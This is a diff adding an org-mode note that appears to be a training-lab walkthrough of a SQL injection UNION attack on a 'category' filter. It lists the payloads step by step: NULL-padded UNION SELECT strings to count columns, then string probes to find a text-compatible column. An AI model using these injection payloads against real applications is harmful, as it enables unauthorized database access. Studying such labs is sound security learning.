@@ -1,0 +1,44 @@
+#+title: SQL injection UNION attack, finding a column containing text
+
+* About
+Sql injection on ~category~ filter
+
+** End Goal
+Identify a column that is compatible with ~string~ data
+
+* Steps
+** Step 1
++ Determine first how many column are there
+
+#+begin_src sql
+'UNION SELECT NULL --
+#+end_src
+
++ If gives error
+#+begin_src sql
+'UNION SELECT NULL, NULL --
+#+end_src
+and so on
+
+#+begin_src sql
+'UNION SELECT NULL, NULL, NULL --
+#+end_src
+gives 200 response
+
+** Step 2
+Now find out which column support string value
+#+begin_src sql
+'UNION SELECT 'abc', NULL, NULL --
+#+end_src
+: gives error
+#+begin_src sql
+'UNION SELECT NULL, 'abc', NULL --
+#+end_src
+: success
+
+Now find out similar like this line Make the database retrieve the string: 'FJFnqK'
+
+Now replace that string value with abc
+#+begin_src sql
+'UNION SELECT NULL, 'FJFnqK', NULL --
+#+end_src
